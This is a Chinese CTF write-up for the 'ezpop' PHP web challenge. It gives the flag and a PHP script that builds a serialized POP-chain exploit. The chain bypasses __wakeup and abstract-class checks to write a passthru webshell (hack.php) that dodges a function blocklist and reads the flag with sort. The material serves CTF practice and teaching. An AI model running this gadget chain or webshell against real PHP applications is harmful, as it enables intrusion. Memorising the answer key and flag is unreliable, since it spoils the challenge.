- **题目名称：** ezpop
- **题目类型：** WEB
- **题目难度：** 中等 
- **出题人：** ABU
- **考点：**

1. 反序列化__wakeup()绕过
2. php抽象类反序列化
3. 命令执行绕过

- **描述：** 听说你是pop大师！

- **flag：** flag{Y0u_Ar3_A_POP_Ma5ter!!!!}

- **Writeup：** 

  php抽象类不能被直接实例化，但其子类可以实例化，并可以通过子类来调用父类方法，并且子类必须实现父类的抽象方法，所以可以通过实例化evil来调用到父类的action方法，进入pass方法，此方法为抽象方法，在子类里实现，所以便进入evil的pass方法，再自己定义一个类来绕过$this->a->d === $this->a->e的判断，用passthru函数绕过函数过滤，用sort读取flag。（当然要先绕过__wakeup()

```php
<?php
class openfunc{
    protected $object;
    function __construct(){
        $this->object=new evil();
    }
    function __wakeup(){
        $this->object=new normal();
    }
    function __destruct(){
        $this->object->action();
    }
}
abstract class hack {

    abstract protected function pass();

    public function action() {
        $this->pass();
    }
}
class normal{
    function action(){
        echo "you must bypass it";
    }
}
class acd #自己定义一个类进行序列化绕过$this->a->d === $this->a->e的判断
{    
    public $d;
    public $e;
    function __construct() 
    {      
        $this->e="a";
        $this->d="a";
    }  

} 
class evil extends hack {
    protected $data;
    protected $a;
    protected $b; 
    protected $c;
    function __construct(){
        $this->data='<?=passthru("sort /fffffl?ggggg");?>';
        $this->b=serialize(new acd());
        $this->c="a";
    }
    protected function pass(){
        $this->a = unserialize($this->b);
        $this->a->d = $this->c;
        if($this->a->d === $this->a->e){
           $this->shell();
        }
        else{
            die('no no no');
        }
    }
    function shell(){
        if(preg_match('/system|eval|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|function|call|\~|\^|\`|flag|cat|tac|more|tail|echo|require|include|proc|open|read|shell|file|put|get|contents|dir|link|dl|var|dump|php/i',$this->data)){
            die("you die");
        }
        $dir = 'scandbox/' . md5($_SERVER['REMOTE_ADDR']) . '/';
        if(!file_exists($dir)){
            mkdir($dir);
            echo $dir;
        }
        file_put_contents("$dir" . "hack.php", $this->data);
    }
}
$a=serialize(new Openfunc());
echo urlencode($a);
?>
```

